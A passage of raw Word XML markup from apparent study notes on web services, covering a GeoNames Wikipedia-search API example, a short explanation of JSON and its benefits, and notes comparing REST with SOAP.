      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> (default = en)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>maxRows</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> : maximal number of rows returned (default = 10)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">Result : returns the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>wikipedia</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> entries found for the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>searchterm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> as xml document</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Example</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId199" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>http://api.geonames.org/wikipediaSearch?q=london&amp;maxRows=10&amp;username=demo</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00A838FC" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A838FC">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00B84F48" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId200" w:history="1">
        <w:r w:rsidR="00267DFA" w:rsidRPr="00DD6AF5">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>http://www.geonames.org/export/ws-overview.html</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>JSON</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, or JavaScript Object Notation, is a minimal, readable format for structuring data. It is used primarily to transmit data between a server and web application, as an alternative to XML.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00E168F8" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="222222"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E168F8">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="222222"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Benefit:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E168F8">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="222222"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rStyle w:val="transcript"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="transcript"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>JSON stands for JavaScript Object Notation, and it's a text format that makes it easy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="transcript"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>to share data between devices like clients and servers.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rStyle w:val="transcript"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pP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r>
        <w:rPr>
          <w:rStyle w:val="transcript"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFEFEF"/>
        </w:rPr>
        <w:t>Because it is smaller and easier to convert into a data structure, it's a great alternative</w:t>
      </w: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to other formats like XML.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rStyle w:val="transcript"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pP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One of the advantages to using JSON is how easy it is to read.</w:t>
      </w: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 xml:space="preserve">JSON uses minimal formatting--really just a few special characters in addition to the data. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="transcript"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Another advantage to JSON is that it's super easy to parse.</w:t>
      </w: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This means that JSON data will take less space and load faster into your web applications.</w:t>
      </w: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Plus, parsing an XML object can be complicated and time consuming, whereas JSON is easily</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="transcript"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>mapped into a JavaScript object and so it takes less time to process.</w:t>
      </w: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p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="009D370D" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rStyle w:val="transcript"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:color w:val="777777"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D370D">
        <w:rPr>
          <w:rStyle w:val="transcript"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:color w:val="777777"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>REST:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00B84F48"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hyperlink r:id="rId201" w:history="1">
        <w:r w:rsidR="00267DFA" w:rsidRPr="00DD6AF5">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>http://www.javatpoint.com/soap-vs-rest-web-services</w:t>
        </w:r>
      </w:hyperlink>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p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293"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REST is an</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>architectural style</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t>REST stands for</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t>REpresentational</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t xml:space="preserve"> State Transfer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>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REST</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>can use SOAP</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web services because it is a concept and can use any protocol like HTTP, SOAP.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t>REST</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t>uses URI to expose business logic</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>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JAX-RS</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 xml:space="preserve">is the java API for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>RESTful</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> web services.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t>REST does not define too much standards like SOAP.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293"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REST</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>requires less bandwidth</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and resource than SOAP.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
      </w:pPr>
